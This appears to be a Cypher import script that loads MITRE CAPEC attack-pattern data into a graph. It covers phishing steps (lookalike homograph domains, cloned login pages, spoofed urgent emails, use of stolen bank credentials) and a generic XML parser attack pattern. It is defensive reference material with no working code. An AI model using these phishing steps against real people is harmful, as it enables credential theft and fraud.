CREATE (:AttackStep{id: 1, title: "Obtain domain name and certificate to spoof legitimate site", description: "<div level=\"0\">\n  <p class=\"text\">This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Optionally obtain a legitimate SSL certificate for the new domain name.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Explore legitimate website and create duplicate", description: "<div level=\"0\">\n  <p class=\"text\">An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use spidering software to get copy of web pages on legitimate site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manually save copies of required web pages from legitimate site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Create new web pages that have the legitimate site's look at feel, but contain completely new content.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Convince user to enter sensitive information on attacker's site.", description: "<div level=\"0\">\n  <p class=\"text\">An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Place phishing link in post to online forum.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Legitimate user clicks on link supplied by attacker and enters the requested information."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Legitimate user realizes that the e-mail is not legitimate, or that the attackers' website is not legitimate, and therefore, does not enter the information requested by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Use stolen credentials to log into legitimate site", description: "<div level=\"0\">\n  <p class=\"text\">Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Log in to the legitimate site using another user's supplied credentials</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:ResourcesRequired{id: 293, text: "<div level=\"0\">\n  <p class=\"text\">Some web development tools to put up a fake website.</p>\n</div>"});
CREATE (:AttackPattern{id: 99, name: "XML Parser Attack", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 562, text: "<div level=\"0\">\n  <p class=\"text\">An application uses an XML parser to perform transformation on user-controllable data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 563, text: "<div level=\"0\">\n  <p class=\"text\">An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</p>\n</div>"});
CREATE (:Submission{id: 614});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 608, summary: "OrderedDict([('Text', \"Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintended system functionality, etc. An attacker's goal is to leverage parser failure to his or her advantage. In some cases it may be possible to jump from the data plane to the control plane via bad data being passed to an XML parser. [R.99.1]\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker determines the input data stream that is being processed by an XML parser on the server side.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the server.</p>\n</div>"});
MERGE (:Reference{id: "REF-43", local_id: "R.99.1", author: "Shlomo, Yona", title: "XML Parser Attacks: A summary of ways to attack an XML Parser", section: "What is an XML Parser Attack?", pubdate: "2007", link: "http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html"});
MERGE (:Reference{local_id: "R.99.2", author: "GulfTech Security Research", title: "PHPXMLRPC Remote Code Execution", section: "BugTraq Archive", pubdate: "June 29, 2005", link: "http://www.securityfocus.com/archive/1/403987"});
MERGE (:CWE{id: 112});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 19});
MERGE (:CWE{id: 674});
MERGE (:CWE{id: 770});
